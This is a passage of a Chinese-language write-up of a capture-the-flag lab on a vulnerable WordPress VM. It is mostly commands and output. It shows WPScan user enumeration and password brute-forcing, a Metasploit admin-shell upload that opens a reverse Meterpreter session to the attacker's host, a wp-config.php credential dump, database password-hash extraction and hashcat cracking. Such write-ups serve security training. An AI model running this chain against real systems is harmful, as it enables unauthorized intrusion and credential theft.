User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] bossperson</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Sun Jan 12 20:45:16 2020</span></span><br><span class="line"><span class="string">[+] Requests Done: 3094</span></span><br><span class="line"><span class="string">[+] Cached Requests: 4</span></span><br><span class="line"><span class="string">[+] Data Sent: 840.6 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 567.645 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 183.743 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:07</span></span><br></pre></td></tr></table></figure>

<p>得到user为bossperson,同样，让枚举另一页。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/so-dev-wordpress/ -U bossperson -P /usr/share/wordlists/dirb/common.txt</span></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">Trying bossperson / zoom Time: 00:00:27 &lt;========================&gt; (4614 / 4614) 100.00% Time: 00:00:27</span><br><span class="line"></span><br><span class="line">[i] No Valid Passwords Found.</span><br></pre></td></tr></table></figure>

<p>找不到任何密码，但是不用担心，因为可以在另一页上运行相同的命令，请输入以下内容进行尝试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/so-dev-wordpress/ --enumerate</span></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] mike</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>找到用户名之后，运行下面的命令爆破密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/so-dev-wordpress/ -U admin,mike -P /usr/share/wordlists/dirb/common.txt</span></span><br><span class="line">[+] Performing password attack on Wp Login against 2 user/s</span><br><span class="line">[SUCCESS] - admin / admin1                                                                             </span><br><span class="line">Trying mike / zope Time: 00:00:36 &lt;==============================&gt; (4914 / 4914) 100.00% Time: 00:00:36</span><br><span class="line"></span><br><span class="line">[i] Valid Combinations Found:</span><br><span class="line"> | Username: admin, Password: admin1</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>得到admin/admin1,终于找到了用户admin的密码。现在，使用msfconsole上传shell。通过Metasploit，使用exploit/unix/webapp/wp_admin_shell_upload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">  Metasploit Park, System Security Interface                                                           </span><br><span class="line">  Version 4.0.5, Alpha E                                                                               </span><br><span class="line">  Ready...                                                                                             </span><br><span class="line">  &gt; access security                                                                                    </span><br><span class="line">  access: PERMISSION DENIED.</span><br><span class="line">  &gt; access security grid</span><br><span class="line">  access: PERMISSION DENIED.</span><br><span class="line">  &gt; access main security grid</span><br><span class="line">  access: PERMISSION DENIED....and...</span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!</span></span><br><span class="line"><span class="string">  YOU DIDN&#x27;</span>T SAY THE MAGIC WORD!                                                                       </span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!                                                                       </span></span><br><span class="line"><span class="string">  YOU DIDN&#x27;</span>T SAY THE MAGIC WORD!                                                                       </span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!                                                                       </span></span><br><span class="line"><span class="string">  YOU DIDN&#x27;</span>T SAY THE MAGIC WORD!                                                                       </span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!                                                                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v5.0.68-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1957 exploits - 1093 auxiliary - 336 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 &gt; use exploit/unix/webapp/wp_admin_shell_upload</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set Pa</span></span><br><span class="line"><span class="string">set PaSSWORD  set PaYLOAD   </span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set PA</span></span><br><span class="line"><span class="string">set PASSWORD  set PAYLOAD   </span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set PASSWORD admin1</span></span><br><span class="line"><span class="string">PASSWORD =&gt; admin1</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set USERNAME admin</span></span><br><span class="line"><span class="string">USERNAME =&gt; admin</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhost 192.168.56.108</span></span><br><span class="line"><span class="string">rhost =&gt; 192.168.56.108</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set TARGET</span></span><br><span class="line"><span class="string">set TARGET     set TARGETURI  </span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set TARGETURI /so-dev-wordpress</span></span><br><span class="line"><span class="string">TARGETURI =&gt; /so-dev-wordpress</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.56.102:4444 </span></span><br><span class="line"><span class="string">[*] Authenticating with WordPress using admin:admin1...</span></span><br><span class="line"><span class="string">[+] Authenticated with WordPress</span></span><br><span class="line"><span class="string">[*] Preparing payload...</span></span><br><span class="line"><span class="string">[*] Uploading payload...</span></span><br><span class="line"><span class="string">[*] Executing the payload at /so-dev-wordpress/wp-content/plugins/RnhGIdzuxq/oElblRDrKY.php...</span></span><br><span class="line"><span class="string">[*] Sending stage (38288 bytes) to 192.168.56.108</span></span><br><span class="line"><span class="string">[*] Meterpreter session 1 opened (192.168.56.102:4444 -&gt; 192.168.56.108:60668) at 2020-01-12 22:03:59 -0500</span></span><br><span class="line"><span class="string">[+] Deleted oElblRDrKY.php</span></span><br><span class="line"><span class="string">[+] Deleted RnhGIdzuxq.php</span></span><br><span class="line"><span class="string">[+] Deleted ../RnhGIdzuxq</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt; id</span></span><br><span class="line"><span class="string">[-] Unknown command: id.</span></span><br><span class="line"><span class="string">meterpreter &gt; sysinfo</span></span><br><span class="line"><span class="string">Computer    : inplainsight</span></span><br><span class="line"><span class="string">OS          : Linux inplainsight 5.3.0-23-generic #25-Ubuntu SMP Tue Nov 12 09:22:33 UTC 2019 x86_64</span></span><br><span class="line"><span class="string">Meterpreter : php/linux</span></span><br></pre></td></tr></table></figure>

<p>成功使用msf拿到了shell，获得标准输出的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1396 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">sh: 0: getcwd() failed: No such file or directory</span><br><span class="line">sh: 0: getcwd() failed: No such file or directory</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">sh: 0: getcwd() failed: No such file or directory</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>探索</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">akismet  hello.php  index.php</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/html/so-dev-wordpress/wp-content/plugins</span><br><span class="line">$ </span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> ../..</span><br><span class="line"><span class="built_in">cd</span> ../..</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">index.php        wp-blog-header.php    wp-cron.php        wp-mail.php</span><br><span class="line">license.txt      wp-comments-post.php  wp-includes        wp-settings.php</span><br><span class="line">readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php</span><br><span class="line">wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php</span><br><span class="line">wp-admin         wp-content            wp-login.php       xmlrpc.php</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/html/so-dev-wordpress</span><br><span class="line">$ cat wp-config.php</span><br><span class="line">cat wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>sodevwp<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>sodevwp<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>oZ2R3c2x7dLL6<span class="comment">#hJ&#x27; );</span></span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database Charset to use <span class="keyword">in</span> creating database tables. */</span><br><span class="line">define( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** The Database Collate <span class="built_in">type</span>. Don<span class="string">&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_COLLATE<span class="string">&#x27;, &#x27;</span><span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**#@+</span></span><br><span class="line"><span class="string"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="string"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="string"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @since 2.6.0</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">define( &#x27;</span>AUTH_KEY<span class="string">&#x27;,         &#x27;</span>b_P&gt;20/J+HW!D1-[XI1~~abSjE~8do)Rp]jt/~Q0s-6/!U,Norv&#123;.+1xOh5+gnPr<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>SECURE_AUTH_KEY<span class="string">&#x27;,  &#x27;</span>nbfna5q3cP5/Gfaa`H`4&#123;SklZTx+inPmf*uh!boz=K`bUSldsl?m`-&#123;0FZ9Kdw4$<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>LOGGED_IN_KEY<span class="string">&#x27;,    &#x27;</span>UC8f4&#123;^Z[9co/&gt;[n*opw @Dtss(?~[dBQ/Xtbm8&amp;/rx1&#123;=Y^obQY`DE7ZYmHwSQT<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>NONCE_KEY<span class="string">&#x27;,        &#x27;</span>Z)O2rZ_IT6fNshPKa^RB:2?EU%a|tV91z,mWU<span class="variable">$rfsoFnbUVKp4l</span>;+z lrN4~T(9h<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>AUTH_SALT<span class="string">&#x27;,        &#x27;</span>]C-xQeq^*m$<span class="variable">$yt</span>:oLqg&gt;b?+teMLO7~&lt;<span class="comment">#|j@(n/K~L!4 n&#123;UCp%|$;;[_@6u]PHxT&#x27; );</span></span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;(rtGT9%Jv uX95E&amp;!tdiTZ7X19u:ak_B_L@YOeRq6eLf.bWV&#123;7|0Kn2JjOmk~[~l&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;1cC3onJs2/0; 5R91DS]m&gt;i|-P1&lt;SaQqUN3Lg`u|4&#123;]aH826Fnt*,[RY?&#123;y0JGeG&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;6a?qf^w0Q1D&#123;%!Y_HIO&amp;#Kc-p19/p8~#*Zo~6NHyZqSgL7ws6=Vdg|*Hijk&lt;7T4&#123;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;sodevwp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27; );</span></span><br></pre></td></tr></table></figure>

<p>现在有了数据库用户名和密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/** The name of the database <span class="keyword">for</span> WordPress */</span><br><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;sodevwp&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;sodevwp&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;oZ2R3c2x7dLL6#hJ&#x27;</span> );</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ mysql -usodevwp -poZ2R3c2x7dLL6<span class="comment">#hJ</span></span><br><span class="line">&lt;o-dev-wordpress$ mysql -usodevwp -poZ2R3c2x7dLL6<span class="comment">#hJ  </span></span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 9805</span><br><span class="line">Server version: 10.3.20-MariaDB-0ubuntu0.19.10.1 Ubuntu 19.10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| sodevwp            |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use sodevwp;</span><br><span class="line">use sodevwp;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [sodevwp]&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+----------------------------+</span><br><span class="line">| Tables_in_sodevwp          |</span><br><span class="line">+----------------------------+</span><br><span class="line">| sodevwp_commentmeta        |</span><br><span class="line">| sodevwp_comments           |</span><br><span class="line">| sodevwp_links              |</span><br><span class="line">| sodevwp_options            |</span><br><span class="line">| sodevwp_postmeta           |</span><br><span class="line">| sodevwp_posts              |</span><br><span class="line">| sodevwp_term_relationships |</span><br><span class="line">| sodevwp_term_taxonomy      |</span><br><span class="line">| sodevwp_termmeta           |</span><br><span class="line">| sodevwp_terms              |</span><br><span class="line">| sodevwp_usermeta           |</span><br><span class="line">| sodevwp_users              |</span><br><span class="line">+----------------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [sodevwp]&gt; select * from sodevwp_users;</span><br><span class="line">select * from sodevwp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | admin      | <span class="variable">$P</span><span class="variable">$BD</span>/ZmfBIhgjHKtkLpPKfhr2t5EDgZA. | admin         | admin@local.lan |          | 2019-11-22 03:41:57 |                     |           0 | admin        |</span><br><span class="line">|  2 | mike       | <span class="variable">$P</span><span class="variable">$B3halPOgh4jqI1tDelkv5TGAHnaOC01</span> | mike          | mike@local.lan  |          | 2019-11-22 03:44:25 |                     |           0 | mike         |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>成功使用上述命令后，将发现以下两个hash值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$P</span><span class="variable">$BD</span>/ZmfBIhgjHKtkLpPKfhr2t5EDgZA.(admin)</span><br><span class="line"><span class="variable">$P</span><span class="variable">$B3halPOgh4jqI1tDelkv5TGAHnaOC01</span>(mike)</span><br></pre></td></tr></table></figure>

<p>将2条hash值保存后，用hashcat破解如下所示，电脑是GTX-1070 8GB显存的显卡，一秒出密码，非常给力，比用john破解快多了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -a 0 -m 400 password.txt D:/wordlists/rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: Intel&#x27;s OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">* Device <span class="comment">#3: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">&quot;CL_OUT_OF_RESOURCES&quot;</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">nvmlInit(): Unknown Error</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#1: Intel(R) UHD Graphics 630, skipped.</span></span><br><span class="line">* Device <span class="comment">#2: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#3: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU</span></span><br><span class="line"></span><br><span class="line">Hashes: 2 digests; 2 unique digests, 2 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: D:/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344360</span><br><span class="line">* Bytes.....: 139921318</span><br><span class="line">* Keyspace..: 14344360</span><br><span class="line"></span><br><span class="line"><span class="variable">$P</span><span class="variable">$B3halPOgh4jqI1tDelkv5TGAHnaOC01</span>:skuxdelux</span><br><span class="line"><span class="variable">$P</span><span class="variable">$BD</span>/ZmfBIhgjHKtkLpPKfhr2t5EDgZA.:admin1</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)</span><br><span class="line">Hash.Target......: password.txt</span><br><span class="line">Time.Started.....: Mon Jan 13 11:20:12 2020 (2 secs)</span><br><span class="line">Time.Estimated...: Mon Jan 13 11:20:14 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (D:/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#3.........:  1199.8 kH/s (6.61ms) @ Accel:512 Loops:128 Thr:64 Vec:1</span></span><br><span class="line">Recovered........: 2/2 (100.00%) Digests, 2/2 (100.00%) Salts</span><br><span class="line">Progress.........: 1048576/28688720 (3.66%)</span><br><span class="line">Rejected.........: 0/1048576 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344360 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:1 Amplifier:0-1 Iteration:8064-8192</span></span><br><span class="line">Candidates.<span class="comment">#3....: 123456 -&gt; chadj85</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Mon Jan 13 11:20:09 2020</span><br><span class="line">Stopped: Mon Jan 13 11:20:15 2020</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub154.jpg"></p>
<p>得到两个密码：<br>admin/admin1<br>mike/skuxdelux</p>
<p>现在，将用户切换为Mike，可以如下观察到可以成功完成操作,这意味着破解密码成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ su admin</span><br><span class="line">su admin</span><br><span class="line">su: user admin does not exist</span><br><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ </span><br><span class="line"></span><br><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ su mike</span><br><span class="line">su mike</span><br><span class="line">Password: skuxdelux</span><br><span class="line"></span><br><span class="line">mike@inplainsight:/var/www/html/so-dev-wordpress$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(mike) gid=1000(mike) groups=1000(mike)</span><br><span class="line">mike@inplainsight:/var/www/html/so-dev-wordpress$ whoami</span><br><span class="line">whoami</span><br><span class="line">mike</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>继续进行特权升级。现在，当您将目录更改为/home时，会发现一个新用户“joe”并且不浪费任何时间，我们遍历了/etc/passwd。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@inplainsight:~$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network 